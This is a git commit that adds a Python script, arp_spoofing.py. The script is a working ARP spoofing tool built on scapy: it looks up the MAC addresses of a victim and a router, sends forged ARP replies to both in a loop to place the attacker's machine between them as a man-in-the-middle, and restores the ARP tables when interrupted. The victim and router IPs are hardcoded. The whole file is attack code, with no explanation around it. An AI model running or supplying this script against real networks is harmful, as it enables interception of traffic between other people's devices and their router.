e1065bb6b2f16e2b9acd1e0af44fe1f9f57c894a
Krishna Yadav <52788412+cryptogeekk@users.noreply.github.com>
2019-09-22 19:12:08 +0530

    Add files via upload

---
+++ arp_spoofing.py
@@ -0,0 +1,60 @@
+import scapy.all as scapy
+import time
+
+
+def get_mac(client_ip):
+    arp_request_client = scapy.ARP(pdst=client_ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_request_broadcast_client = broadcast / arp_request_client
+    answered_list = []
+    (answered_list, unanswered) = scapy.srp(arp_request_broadcast_client, timeout=1, verbose=False)
+    for element in answered_list:
+        return element[1].hwsrc
+
+
+def spoof(client_ip, router_ip):
+    client_mac = get_mac(client_ip)
+    router_mac = get_mac(router_ip)
+
+    # creating a packet to the victim
+    packet_to_victim = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=router_ip)
+
+    # sending the packet to the victim
+    scapy.send(packet_to_victim, verbose=False)
+
+    # creating and sending packets to a router
+    packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=client_ip)
+    scapy.send(packet_to_router, verbose=False)
+
+    # packet_to_router.show()
+
+
+def restore(client_ip, router_ip):
+    client_mac = get_mac(client_ip)
+    router_mac = get_mac(router_ip)
+
+    # creating a packet to the victim
+    packet_to_victim = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=router_ip, hwsrc=router_mac)
+
+    # sending the packet to the victim
+    # count=4 means sending 4 packets at the time.
+    scapy.send(packet_to_victim, count=4, verbose=False)
+
+    # creating and sending packets to a router
+    packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=client_ip, hwsrc=client_mac)
+    scapy.send(packet_to_router, count=4, verbose=False)
+
+    # packet_to_router.show()
+
+
+packet_no = 2
+try:
+    while True:
+        print("[+] Packets Sent : " + str(packet_no))
+        spoof("192.168.1.14", "192.168.1.1")
+        time.sleep(1)
+        packet_no = packet_no + 2;
+
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C \n Restoring ARP table  \nQuitting.......")
+    restore("192.168.1.14", "192.168.1.1")
